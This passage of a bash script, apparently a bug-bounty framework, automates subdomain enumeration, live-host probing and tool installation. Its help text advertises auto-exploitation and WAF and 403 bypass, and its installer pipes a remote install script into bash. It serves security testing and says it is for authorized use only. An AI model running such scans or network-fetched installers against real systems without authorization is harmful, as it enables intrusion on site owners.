#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║   BUG FRAMEWORK v5.1  —  Recon · Detection · AUTO-EXPLOITATION Suite         ║
# ║   IDOR | BAC | OAuth | XSS | SQLi | SSRF | LFI | CMDi | CSRF | OWASP TOP 10 ║
# ║   ⚡ AUTHORIZED & IN-SCOPE TARGETS ONLY — STRICTLY FOR BUG BOUNTY USE ⚡    ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
#
# LEGAL NOTICE: This tool is for authorized security testing ONLY.
# Running this against targets without explicit written permission is illegal.
# The author assumes zero liability for unauthorized or illegal use.

set -uo pipefail
IFS=$'\n\t'

# ══════════════════════════════════════════════════════
# VERSION & META
# ══════════════════════════════════════════════════════
readonly VERSION="5.1"
readonly TOOL_NAME="BUG FRAMEWORK"

# ══════════════════════════════════════════════════════
# COLORS & SYMBOLS
# ══════════════════════════════════════════════════════
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly CYAN='\033[0;36m'
readonly MAGENTA='\033[0;35m'
readonly WHITE='\033[1;37m'
readonly BOLD='\033[1m'
readonly DIM='\033[2m'
readonly NC='\033[0m'
readonly ORANGE='\033[38;5;208m'

readonly SYM_OK="${GREEN}[✔]${NC}"
readonly SYM_FAIL="${RED}[✖]${NC}"
readonly SYM_WARN="${YELLOW}[!]${NC}"
readonly SYM_INFO="${CYAN}[*]${NC}"
readonly SYM_HIT="${RED}[💥]${NC}"
readonly SYM_BUG="${MAGENTA}[🐛]${NC}"

# ══════════════════════════════════════════════════════
# GLOBALS — set via parse_args
# ══════════════════════════════════════════════════════
DOMAIN=""
WORKSPACE=""
LOG_MASTER=""
START_TIME=$(date +%s)
SCAN_STEP=0
SCAN_TOTAL=24

# Tunables
T_HTTPX=50
T_NUCLEI=50
R_NUCLEI=150
T_FFUF=100
T_KATANA=50
D_KATANA=3
T_DALFOX=30
TIMEOUT_CONN=10
MAX_SUBS_WB=30

# Feature flags
F_QUICK=false
F_DEEP=false
F_NO_EXPLOIT=false
F_RESUME=false
F_SILENT=false
F_BANNER=true
F_INSTALL=false
F_UPDATE_NUCLEI=false

# Mode flags
M_SUB=false
M_ONE=false
M_URL=false
M_WE=false
M_JS=false
M_FUZZ=false
M_VULN=false
M_NUCLEI_ONLY=false
M_XSS=false
M_SQLI=false
M_SSRF=false
M_LFI=false
M_CSRF=false
M_CORS=false
M_IDOR=false
M_OAUTH=false
M_REPORT=false
M_SCOPE=false
M_WAF=false
M_API=false
M_PMF=false
M_PORTS=false
M_TECH=false
M_EXPLOIT=false

SCOPE_FILE=""
SESSION_COOKIE=""
PROXY_URL=""
CUSTOM_WL=""
CUSTOM_THREADS=""
CUSTOM_RATE=""
declare -a CUSTOM_HEADERS=()

# ══════════════════════════════════════════════════════
# BANNER
# ══════════════════════════════════════════════════════
print_banner() {
    [[ "$F_BANNER" == false ]] && return
    clear
    echo -e "${RED}"
    cat << 'BNREOF'
 ██████╗ ██╗   ██╗ ██████╗     ███████╗██████╗  █████╗ ███╗   ███╗███████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
 ██╔══██╗██║   ██║██╔════╝     ██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔════╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
 ██████╔╝██║   ██║██║  ███╗    █████╗  ██████╔╝███████║██╔████╔██║█████╗  ██║ █╗ ██║██║   ██║██████╔╝█████╔╝
 ██╔══██╗██║   ██║██║   ██║    ██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║███╗██║██║   ██║██╔══██╗██╔═██╗
 ██████╔╝╚██████╔╝╚██████╔╝    ██║     ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
 ╚═════╝  ╚═════╝  ╚═════╝     ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
BNREOF
    echo -e "${NC}"
    echo -e "  ${DIM}╔────────────────────────────────────────────────────────────────────────────────╗${NC}"
    echo -e "  ${DIM}│${NC}  ${BOLD}${WHITE}v${VERSION} ELITE · AUTO-EXPLOIT${NC}  ${DIM}│${NC}  ${CYAN}IDOR · BAC · OAuth · XSS · SQLi · SSRF · LFI · CMDi · CSRF · OWASP${NC}  ${DIM}│${NC}"
    echo -e "  ${DIM}╚────────────────────────────────────────────────────────────────────────────────╝${NC}"
    echo -e "  ${RED}${BOLD}⚡  AUTHORIZED & IN-SCOPE TARGETS ONLY  ⚡${NC}"
    echo ""
}

# ══════════════════════════════════════════════════════
# HELP
# ══════════════════════════════════════════════════════
show_help() {
    print_banner
    cat << 'HELPEOF'
FULL SCAN MODES
  bug -d <domain>                   Full aggressive recon + detection + AUTO-EXPLOITATION
  bug -d <domain> --quick           Fast scan (skip slow/heavy modules)
  bug -d <domain> --deep            Ultra aggressive (max threads + deep wordlists)
  bug -d <domain> --no-exploit      Recon + detection only (no active fuzzing)
  bug -d <domain> --resume          Resume a stopped scan from last checkpoint

RECON MODES
  bug -d <domain> -sub              Subdomain enumeration only
  bug -d <domain> -one              Single domain only (no subdomain enum)
  bug -d <domain> -url              URL collection only
  bug -d <domain> -we               URL + endpoint discovery (fast combo)
  bug -d <domain> -js               JavaScript analysis only
  bug -d <domain> -fuzz             Directory bruteforce + 403 bypass
  bug -d <domain> -ports            Port scan only (nmap)
  bug -scope <file>                 Scan multiple domains from file

DETECTION MODES
  bug -d <domain> -vuln             Full detection scan
  bug -d <domain> -exploit          AUTO-EXPLOIT confirmed findings (chain)
  bug -d <domain> -nuclei           Nuclei only
  bug -d <domain> -xss              XSS detection only (dalfox)
  bug -d <domain> -sqli             SQLi detection only (sqlmap)
  bug -d <domain> -ssrf             SSRF detection only
  bug -d <domain> -lfi              LFI detection only
  bug -d <domain> -csrf             CSRF + CORS detection
  bug -d <domain> -cors             CORS only
  bug -d <domain> -idor             IDOR + BAC classification
  bug -d <domain> -oauth            OAuth/Auth flow analysis
  bug -d <domain> -tech             Technology-specific checks
  bug -d <domain> -waf              WAF fingerprint + bypass profiling
  bug -d <domain> -api              API schema discovery (OpenAPI/GraphQL)
  bug -d <domain> -pmf              Parameter mutation fuzzing (SSTI/hidden/JSON)

REPORT
  bug -d <domain> -report           Regenerate HTML + MD report

OPTIONS (apply to any mode)
  --cookie  <value>                 Session cookie (authenticated scans)
  --header  <value>                 Custom header (repeatable)
  --proxy   <url>                   Route traffic through proxy (Burp etc)
  --wordlist <file>                 Custom wordlist for fuzzing
  --threads <n>                     Override thread count
  --rate    <n>                     Override requests per second
  --timeout <n>                     Override connection timeout
  --silent                          Suppress verbose, show findings only
  --no-banner                       Skip ASCII art banner

UTILITY
  bug --install                     Install all required tools
  bug --update-nuclei               Update nuclei templates only
  bug -h / --help                   Show this help

HELPEOF
    exit 0
}

# ══════════════════════════════════════════════════════
# ARGUMENT PARSING
# ══════════════════════════════════════════════════════
parse_args() {
    [[ $# -eq 0 ]] && show_help
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -d)              DOMAIN="$(echo ${2:-} | sed 's|https\?://||g' | sed 's|/$||g')"; shift ;;
            --quick)         F_QUICK=true ;;
            --deep)          F_DEEP=true ;;
            --no-exploit)    F_NO_EXPLOIT=true ;;
            --resume)        F_RESUME=true ;;
            --silent)        F_SILENT=true ;;
            --no-banner)     F_BANNER=false ;;
            --install)       F_INSTALL=true ;;
            --update-nuclei) F_UPDATE_NUCLEI=true ;;
            --cookie)        SESSION_COOKIE="${2:-}"; shift ;;
            --header)        CUSTOM_HEADERS+=("${2:-}"); shift ;;
            --proxy)         PROXY_URL="${2:-}"; shift ;;
            --wordlist)      CUSTOM_WL="${2:-}"; shift ;;
            --threads)       CUSTOM_THREADS="${2:-}"; shift ;;
            --rate)          CUSTOM_RATE="${2:-}"; shift ;;
            --timeout)       TIMEOUT_CONN="${2:-10}"; shift ;;
            -sub)            M_SUB=true ;;
            -one)            M_ONE=true ;;
            -url)            M_URL=true ;;
            -we)             M_WE=true ;;
            -js)             M_JS=true ;;
            -fuzz)           M_FUZZ=true ;;
            -ports)          M_PORTS=true ;;
            -vuln)           M_VULN=true ;;
            -exploit)        M_EXPLOIT=true ;;
            -nuclei)         M_NUCLEI_ONLY=true ;;
            -xss)            M_XSS=true ;;
            -sqli)           M_SQLI=true ;;
            -ssrf)           M_SSRF=true ;;
            -lfi)            M_LFI=true ;;
            -csrf)           M_CSRF=true ;;
            -cors)           M_CORS=true ;;
            -idor)           M_IDOR=true ;;
            -oauth)          M_OAUTH=true ;;
            -tech)           M_TECH=true ;;
            -report)         M_REPORT=true ;;
            -waf)            M_WAF=true ;;
            -api)            M_API=true ;;
            -pmf)            M_PMF=true ;;
            -scope)          SCOPE_FILE="${2:-}"; M_SCOPE=true; shift ;;
            -h|--help|-help) show_help ;;
            *)               log_err "Unknown option: $1"; show_help ;;
        esac
        shift
    done

    # Deep mode overrides
    if [[ "$F_DEEP" == true ]]; then
        T_HTTPX=100; T_NUCLEI=100; R_NUCLEI=300
        T_FFUF=200;  T_KATANA=100; D_KATANA=6
        T_DALFOX=60; MAX_SUBS_WB=80
    fi

    # Custom thread/rate overrides
    [[ -n "$CUSTOM_THREADS" ]] && T_HTTPX="$CUSTOM_THREADS" T_NUCLEI="$CUSTOM_THREADS" T_FFUF="$CUSTOM_THREADS"
    [[ -n "$CUSTOM_RATE" ]]    && R_NUCLEI="$CUSTOM_RATE"
}

# ══════════════════════════════════════════════════════
# LOGGING
# ══════════════════════════════════════════════════════
log_info()  {
    [[ "$F_SILENT" == true ]] && return
    local ts; ts=$(date '+%H:%M:%S')
    echo -e "${SYM_INFO} ${DIM}[${ts}]${NC} $*" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}
log_ok()    {
    local ts; ts=$(date '+%H:%M:%S')
    echo -e "${SYM_OK} ${GREEN}[${ts}]${NC} $*" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}
log_warn()  {
    local ts; ts=$(date '+%H:%M:%S')
    echo -e "${SYM_WARN} ${YELLOW}[${ts}]${NC} ${BOLD}$*${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}
log_err()   {
    local ts; ts=$(date '+%H:%M:%S')
    echo -e "${SYM_FAIL} ${RED}[${ts}]${NC} $*" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}

# ── Global duplicate suppression: each unique finding prints ONCE ──
declare -A _HIT_SEEN=()
log_hit() {
    local key="$*"
    [[ -n "${_HIT_SEEN[$key]:-}" ]] && return
    _HIT_SEEN[$key]=1
    local ts; ts=$(date '+%H:%M:%S')
    echo -e "${SYM_HIT} ${BOLD}${RED}[${ts}] ▶ FINDING: $*${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}

# ── Append to result file ONLY if line is new; 0=new 1=dup ──
uniq_add() {
    local file="$1"; shift
    mkdir -p "$(dirname "$file")" 2>/dev/null || true
    touch "$file" 2>/dev/null || true
    local line="$*"
    grep -qxF -- "$line" "$file" 2>/dev/null && return 1
    echo "$line" >> "$file"
    return 0
}

# ── Native bash reachability filter — keep live, non-WAF-blocked URLs ──
active_filter() {
    local in_file="$1" out_file="$2" max="${3:-30}"
    : > "$out_file"
    local n=0
    while IFS= read -r url && [[ $n -lt $max ]]; do
        [[ -z "$url" ]] && continue
        local code
        code=$(_curl --max-time 8 -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
        case "$code" in
            200|201|202|204|301|302|307|308|401|404|405|500|501|502|503)
                echo "$url" >> "$out_file"; n=$((n+1)) ;;
        esac
    done < "$in_file"
    sort -u -o "$out_file" "$out_file" 2>/dev/null || true
}

# ── Final pass: every result file in the workspace is unique ──
dedupe_workspace() {
    log_info "Deduplicating all result files..."
    local n=0
    while IFS= read -r f; do
        sort -u -o "$f" "$f" 2>/dev/null && n=$((n+1)) || true
    done < <(find "$WORKSPACE" -name "*.txt" -type f 2>/dev/null)
    log_ok "Deduplicated $n files"
}

log_step()  {
    local ts; ts=$(date '+%H:%M:%S')
    echo "" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
    echo -e "  ${BOLD}${MAGENTA}╔══════════════════════════════════════════════════════╗${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
    echo -e "  ${BOLD}${MAGENTA}║  ${YELLOW}⚡${NC} ${BOLD}${WHITE}[$ts] $*${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
    echo -e "  ${BOLD}${MAGENTA}╚══════════════════════════════════════════════════════╝${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
    echo "" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}
log_section() {
    echo "" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
    echo -e "  ${BOLD}${BLUE}┌──────────────────────────────────────────────────────────────┐${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
    printf "  ${BOLD}${BLUE}│  ${YELLOW}%-60s${BLUE}│${NC}\n" "⚡  $1" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
    echo -e "  ${BOLD}${BLUE}└──────────────────────────────────────────────────────────────┘${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
    echo "" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}
progress()  {
    SCAN_STEP=$((SCAN_STEP + 1))
    local pct=$(( SCAN_STEP * 100 / SCAN_TOTAL ))
    local fill=$(( pct / 4 ))
    local bar=""
    for ((i=0;i<fill;i++)); do bar+="█"; done
    for ((i=fill;i<25;i++)); do bar+="░"; done
    echo -e "\n${CYAN}  ▸ [${bar}] ${pct}% — ${BOLD}$1${NC}\n" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
}

# ══════════════════════════════════════════════════════
# HELPERS
# ══════════════════════════════════════════════════════
has()       { command -v "$1" &>/dev/null; }
cnt()       { wc -l < "${1:-/dev/null}" 2>/dev/null || echo 0; }
safe_name() { echo "$1" | md5sum | cut -c1-12; }

# curl with optional cookie/proxy/headers
_curl() {
    local args=(-s --max-time "$TIMEOUT_CONN" --connect-timeout 5)
    [[ -n "$SESSION_COOKIE" ]] && args+=(-b "$SESSION_COOKIE")
    [[ -n "$PROXY_URL"      ]] && args+=(-x "$PROXY_URL")
    for h in "${CUSTOM_HEADERS[@]:-}"; do
        [[ -n "$h" ]] && args+=(-H "$h")
    done
    curl "${args[@]}" "$@"
}

# nuclei with optional cookie/proxy
_nuclei() {
    local args=()
    [[ -n "$SESSION_COOKIE" ]] && args+=(-H "Cookie: $SESSION_COOKIE")
    [[ -n "$PROXY_URL"      ]] && args+=(-proxy "$PROXY_URL")
    for h in "${CUSTOM_HEADERS[@]:-}"; do
        [[ -n "$h" ]] && args+=(-H "$h")
    done
    nuclei "${args[@]}" "$@"
}

# ffuf with optional cookie/proxy
_ffuf() {
    local args=()
    [[ -n "$SESSION_COOKIE" ]] && args+=(-b "$SESSION_COOKIE")
    [[ -n "$PROXY_URL"      ]] && args+=(-x "$PROXY_URL")
    for h in "${CUSTOM_HEADERS[@]:-}"; do
        [[ -n "$h" ]] && args+=(-H "$h")
    done
    ffuf "${args[@]}" "$@"
}

# ══════════════════════════════════════════════════════
# WORKSPACE & RESUME
# ══════════════════════════════════════════════════════
setup_workspace() {
    WORKSPACE="$HOME/bug-bounty/$(echo $DOMAIN | sed 's|https\?://||g' | sed 's|/$||g')"
    mkdir -p "$WORKSPACE"/{subdomains,urls/gf,js/downloaded,paths,endpoints,params,\
vulns/{xss,sqli,ssrf,lfi,csrf,cmdi,idor,nuclei,misconfig/graphql,param_fuzz},\
classified/{idor,bac,oauth,upload,export,payment,webhook,admin,debug,burp_imports},\
screenshots,reports,logs}

    LOG_MASTER="$WORKSPACE/logs/master.log"
    touch "$LOG_MASTER"

    cat > "$WORKSPACE/scan_config.txt" << EOF
TARGET=$DOMAIN
DATE=$(date)
VERSION=$VERSION
MODE=$(if [[ "$F_DEEP" == true ]]; then echo DEEP; elif [[ "$F_QUICK" == true ]]; then echo QUICK; else echo FULL; fi)
AUTH=$(if [[ -n "$SESSION_COOKIE" ]]; then echo AUTHENTICATED; else echo UNAUTHENTICATED; fi)
PROXY=${PROXY_URL:-NONE}
EOF

    echo ""
    echo -e "  ${BOLD}${WHITE}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "  ${BOLD}${WHITE}║  TARGET    : ${CYAN}${DOMAIN}${NC}"
    echo -e "  ${BOLD}${WHITE}║  WORKSPACE : ${DIM}${WORKSPACE}${NC}"
    echo -e "  ${BOLD}${WHITE}║  MODE      : ${YELLOW}$(if [[ "$F_DEEP" == true ]]; then echo "DEEP 🔥"; elif [[ "$F_QUICK" == true ]]; then echo "QUICK ⚡"; else echo "FULL 💀"; fi)${NC}"
    [[ -n "$SESSION_COOKIE" ]] && echo -e "  ${BOLD}${WHITE}║  AUTH      : ${GREEN}Authenticated (cookie set)${NC}"
    [[ -n "$PROXY_URL"      ]] && echo -e "  ${BOLD}${WHITE}║  PROXY     : ${GREEN}${PROXY_URL}${NC}"
    echo -e "  ${BOLD}${WHITE}╚══════════════════════════════════════════════════╝${NC}"
    echo ""
}

mark_done() { echo "$1" >> "$WORKSPACE/.done" 2>/dev/null || true; }
is_done()   { [[ "$F_RESUME" == true ]] && grep -q "^$1$" "$WORKSPACE/.done" 2>/dev/null; }
run_mod()   {
    local name="$1"; shift
    if is_done "$name"; then
        log_info "SKIP: $name (resumed)"
        return 0
    fi
    "$@"
    mark_done "$name"
}

# ══════════════════════════════════════════════════════
# PREFLIGHT — ensure minimal data exists for focused modes
# ══════════════════════════════════════════════════════
ensure_live() {
    [[ -s "$WORKSPACE/subdomains/live_urls.txt" ]] && return
    log_info "No live_urls.txt — running quick probe for $DOMAIN..."
    {
        echo "https://$DOMAIN"
        subfinder -d "$DOMAIN" -silent 2>/dev/null \
            | httpx -silent -threads "$T_HTTPX" -timeout "$TIMEOUT_CONN"
    } | sort -u > "$WORKSPACE/subdomains/live_urls.txt"
    touch "$WORKSPACE/subdomains/status_200.txt" \
          "$WORKSPACE/subdomains/status_403.txt" \
          "$WORKSPACE/subdomains/tech_stack.txt"
}

ensure_urls() {
    [[ -s "$WORKSPACE/urls/all_urls.txt" ]] && return
    ensure_live
    log_info "No URL data — quick collection for $DOMAIN..."
    {
        echo "$DOMAIN" | timeout 60 waybackurls 2>/dev/null
        echo "$DOMAIN" | timeout 60 gau --threads 5 2>/dev/null
    } | sort -u > "$WORKSPACE/urls/all_urls.txt"
    grep -E '\?[a-zA-Z0-9_]+=.' "$WORKSPACE/urls/all_urls.txt" | sort -u \
        > "$WORKSPACE/urls/urls_with_params.txt"
    for p in xss sqli ssrf lfi redirect idor; do
        gf "$p" "$WORKSPACE/urls/all_urls.txt" 2>/dev/null | sort -u \
            > "$WORKSPACE/urls/gf/${p}.txt"
    done
    grep -oP 'https?://[^/]+\K(/[^?\s]*)?' "$WORKSPACE/urls/all_urls.txt" 2>/dev/null \
        | sort -u > "$WORKSPACE/endpoints/all_endpoints.txt"
    touch "$WORKSPACE/endpoints/interesting_paths.txt"
}

# ══════════════════════════════════════════════════════
# INSTALL TOOLS
# ══════════════════════════════════════════════════════
install_tools() {
    log_step "INSTALLING ALL REQUIRED TOOLS"
    export PATH="$PATH:/usr/local/go/bin:$HOME/go/bin"
    export GOPATH="$HOME/go"

    log_info "Updating apt..."
    sudo apt-get update -qq 2>/dev/null || true

    local APT_PKGS=(python3 python3-pip curl wget git jq nmap sqlmap openssl)
    for pkg in "${APT_PKGS[@]}"; do
        has "$pkg" && { log_ok "$pkg ✓"; continue; }
        log_info "Installing $pkg..."
        sudo apt-get install -y -qq "$pkg" 2>/dev/null && log_ok "$pkg installed" || log_warn "$pkg failed"
    done

    # Go
    if ! has go; then
        log_info "Installing Go 1.22..."
        wget -q "https://go.dev/dl/go1.22.0.linux-amd64.tar.gz" -O /tmp/go.tar.gz
        sudo tar -C /usr/local -xzf /tmp/go.tar.gz
        echo 'export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin' >> ~/.bashrc
        export PATH="$PATH:/usr/local/go/bin:$HOME/go/bin"
    fi

    local GO_PKGS=(
        "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
        "github.com/projectdiscovery/httpx/cmd/httpx@latest"
        "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
        "github.com/projectdiscovery/katana/cmd/katana@latest"
        "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
        "github.com/projectdiscovery/alterx/cmd/alterx@latest"
        "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
        "github.com/tomnomnom/waybackurls@latest"
        "github.com/tomnomnom/gf@latest"
        "github.com/tomnomnom/anew@latest"
        "github.com/tomnomnom/qsreplace@latest"
        "github.com/lc/gau/v2/cmd/gau@latest"
        "github.com/hahwul/dalfox/v2@latest"
        "github.com/hakluke/hakrawler@latest"
        "github.com/ffuf/ffuf/v2@latest"
        "github.com/003random/getJS@latest"
        "github.com/owasp-amass/amass/v4/...@master"
        "github.com/tomnomnom/assetfinder@latest"
        "github.com/sensepost/gowitness@latest"
    )
    for pkg in "${GO_PKGS[@]}"; do
        local name; name=$(basename "${pkg%@*}")
        has "$name" && { log_ok "$name ✓"; continue; }
        log_info "Installing $name..."
        go install "$pkg" 2>/dev/null && log_ok "$name installed" || log_warn "$name failed"
    done

    local PIP_PKGS=(waymore uro arjun dirsearch wafw00f)
    for pkg in "${PIP_PKGS[@]}"; do
        pip3 show "$pkg" &>/dev/null && { log_ok "$pkg ✓"; continue; }
        pip3 install -q "$pkg" --break-system-packages 2>/dev/null \
            && log_ok "$pkg installed" || log_warn "$pkg failed"
    done

    # feroxbuster
    has feroxbuster || {
        curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh \
            | bash -s /usr/local/bin 2>/dev/null \
            && log_ok "feroxbuster installed"
    }

    # git-dumper
    has git-dumper || {
        pip3 install -q git-dumper --break-system-packages 2>/dev/null \
            && log_ok "git-dumper installed"
    }

    # SecretFinder
    [[ ! -f "$HOME/tools/SecretFinder/SecretFinder.py" ]] && {
        mkdir -p "$HOME/tools"
        git clone -q https://github.com/m4ll0k/SecretFinder.git "$HOME/tools/SecretFinder" 2>/dev/null
        pip3 install -qr "$HOME/tools/SecretFinder/requirements.txt" --break-system-packages 2>/dev/null
        log_ok "SecretFinder installed"
    }

    # LinkFinder
    [[ ! -f "$HOME/tools/LinkFinder/linkfinder.py" ]] && {
        git clone -q https://github.com/GerbenJavado/LinkFinder.git "$HOME/tools/LinkFinder" 2>/dev/null
        pip3 install -qr "$HOME/tools/LinkFinder/requirements.txt" --break-system-packages 2>/dev/null
        log_ok "LinkFinder installed"
    }

    # jwt_tool
    [[ ! -f "$HOME/tools/jwt_tool/jwt_tool.py" ]] && {
        git clone -q https://github.com/ticarpi/jwt_tool.git "$HOME/tools/jwt_tool" 2>/dev/null
        pip3 install -qr "$HOME/tools/jwt_tool/requirements.txt" --break-system-packages 2>/dev/null
        log_ok "jwt_tool installed"
    }

    # GF patterns
    [[ ! -d "$HOME/.gf" ]] && {
        mkdir -p ~/.gf
        git clone -q https://github.com/1ndianl33t/Gf-Patterns.git /tmp/gfp 2>/dev/null
        cp /tmp/gfp/*.json ~/.gf/ 2>/dev/null || true
        git clone -q https://github.com/tomnomnom/gf.git /tmp/gfsrc 2>/dev/null
        cp /tmp/gfsrc/examples/*.json ~/.gf/ 2>/dev/null || true
        log_ok "GF patterns installed"
    }

    # nuclei templates
    [[ ! -d "$HOME/nuclei-templates" ]] && nuclei -update-templates -silent 2>/dev/null \
        && log_ok "Nuclei templates downloaded"

    # SecLists
    if [[ ! -f "/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt" ]]; then
        log_info "Installing SecLists..."
        sudo apt-get install -y -qq seclists 2>/dev/null \
            || git clone -q --depth 1 https://github.com/danielmiessler/SecLists.git /usr/share/seclists 2>/dev/null
        log_ok "SecLists installed"
    fi

    log_ok "All tools ready! Run: bug -d <domain>"
}

# ══════════════════════════════════════════════════════
# MODULE 01 — SUBDOMAIN ENUMERATION
# ══════════════════════════════════════════════════════
mod_subdomains() {
    progress "MODULE 01 — Subdomain Enumeration"
    log_section "MODULE 01 — SUBDOMAIN ENUMERATION"
    local O="$WORKSPACE/subdomains"

    log_info "subfinder (all sources, recursive)..."
    subfinder -d "$DOMAIN" -silent -all -recursive -o "$O/subfinder.txt" 2>/dev/null || true
    log_ok "subfinder: $(cnt "$O/subfinder.txt") subdomains"

    log_info "crt.sh certificate transparency..."
    _curl "https://crt.sh/?q=%25.${DOMAIN}&output=json" \
        | jq -r '.[].name_value' 2>/dev/null \
        | sed 's/\*\.//g' | sort -u > "$O/crtsh.txt" || true
    log_ok "crt.sh: $(cnt "$O/crtsh.txt") subdomains"

    log_info "assetfinder..."
    assetfinder --subs-only "$DOMAIN" 2>/dev/null | sort -u > "$O/assetfinder.txt" || true

    log_info "urlscan.io..."
    _curl "https://urlscan.io/api/v1/search/?q=domain:${DOMAIN}&size=10000" \
        | jq -r '.results[]?.page?.domain' 2>/dev/null \
        | grep -F ".${DOMAIN}" | sort -u > "$O/urlscan_subs.txt" || true

    _curl "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" \
        | cut -d',' -f1 | sort -u > "$O/hackertarget.txt" 2>/dev/null || true

    _curl "https://rapiddns.io/subdomain/$DOMAIN?full=1" 2>/dev/null \
        | grep -oE "[a-zA-Z0-9._-]+\.${DOMAIN}" | sort -u > "$O/rapiddns.txt" || true

    _curl "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=$DOMAIN" \
        | jq -r '.subdomains[]?' 2>/dev/null | sort -u > "$O/threatcrowd.txt" || true

    if [[ -n "${PDCP_API_KEY:-}" ]]; then
        chaos -d "$DOMAIN" -silent -key "$PDCP_API_KEY" 2>/dev/null \
            | sort -u > "$O/chaos.txt" || true
        log_ok "chaos: $(cnt "$O/chaos.txt")"
    fi

    if [[ "$F_QUICK" == false ]]; then
        log_info "amass passive (2 min cap)..."
        timeout 120 amass enum -passive -d "$DOMAIN" -o "$O/amass.txt" -silent 2>/dev/null || true
        log_ok "amass: $(cnt "$O/amass.txt")"

        log_info "alterx permutation expansion..."
        cat "$O/subfinder.txt" 2>/dev/null \
            | alterx -silent 2>/dev/null \
            | head -5000 | sort -u > "$O/alterx.txt" || true
        log_ok "alterx: $(cnt "$O/alterx.txt") candidates"
    fi

    # Merge & validate — dedup enforced
    cat "$O"/*.txt 2>/dev/null \
        | sort -u \
        | grep -E "^[a-zA-Z0-9]([a-zA-Z0-9._-]*)\.${DOMAIN}$" \
        > "$O/all_subdomains.txt" || true
    log_ok "Total unique subdomains: $(cnt "$O/all_subdomains.txt")"

    log_info "DNS resolution via dnsx..."
    cat "$O/all_subdomains.txt" \
        | dnsx -silent -a -cname -resp -o "$O/resolved_full.txt" 2>/dev/null || true
    awk '{print $1}' "$O/resolved_full.txt" 2>/dev/null > "$O/resolved_domains.txt"
    sort -u -o "$O/resolved_domains.txt" "$O/resolved_domains.txt" 2>/dev/null || true
    log_ok "Resolved: $(cnt "$O/resolved_domains.txt") live subdomains"

    local wc_ip; wc_ip=$(dig "randomx99nomatch.$DOMAIN" A +short 2>/dev/null | head -1 || true)
    [[ -n "$wc_ip" ]] && log_warn "Wildcard DNS detected: $wc_ip — expect false positives"

    grep -iE "(github\.io|heroku|amazonaws|cloudfront|azurewebsites|netlify|surge\.sh|bitbucket\.io|fastly)" \
        "$O/resolved_full.txt" 2>/dev/null | sort -u > "$O/takeover_candidates.txt" || true
    [[ -s "$O/takeover_candidates.txt" ]] && \
        log_warn "Potential takeover candidates: $(cnt "$O/takeover_candidates.txt")"
}

# ══════════════════════════════════════════════════════
# MODULE 02 — LIVE HOST PROBING
# ══════════════════════════════════════════════════════
mod_httpx() {
    progress "MODULE 02 — Live Host Probing"
    log_section "MODULE 02 — LIVE HOST PROBING (httpx)"
    local O="$WORKSPACE/subdomains"

    if [[ "$M_ONE" == true ]]; then
        echo "https://$DOMAIN" > "$O/live_urls.txt"
        echo "https://$DOMAIN" > "$O/status_200.txt"
        touch "$O/status_403.txt" "$O/status_401.txt" "$O/tech_stack.txt"
        log_ok "-one mode: single target https://$DOMAIN"
        return
    fi

    log_info "httpx full fingerprint (threads: $T_HTTPX)..."
    {
        cat "$O/resolved_domains.txt" "$O/all_subdomains.txt" 2>/dev/null
        echo "$DOMAIN"
    } | sort -u | httpx -silent \
        -status-code -title -tech-detect \
        -content-length -web-server -ip -cname -cdn \
        -ports 80,443,8080,8443,8888,8000,3000,4000,5000,9000,9443 \
        -threads "$T_HTTPX" -timeout "$TIMEOUT_CONN" \
        -follow-redirects \
        ${SESSION_COOKIE:+-H "Cookie: $SESSION_COOKIE"} \
        ${PROXY_URL:+-http-proxy "$PROXY_URL"} \
        -json -o "$O/live_hosts.json" 2>/dev/null || true

    jq -r '.url' "$O/live_hosts.json" 2>/dev/null | sort -u > "$O/live_urls.txt"
    log_ok "Live hosts: $(cnt "$O/live_urls.txt")"

    for code in 200 301 302 401 403 404 500; do
        jq -r "select(.status_code==$code) | .url" "$O/live_hosts.json" 2>/dev/null \
            | sort -u > "$O/status_${code}.txt" || true
    done
    log_ok "200:$(cnt "$O/status_200.txt") | 403:$(cnt "$O/status_403.txt") | 401:$(cnt "$O/status_401.txt") | 500:$(cnt "$O/status_500.txt")"

    cp "$O/status_403.txt" "$WORKSPACE/paths/403_targets.txt" 2>/dev/null || true

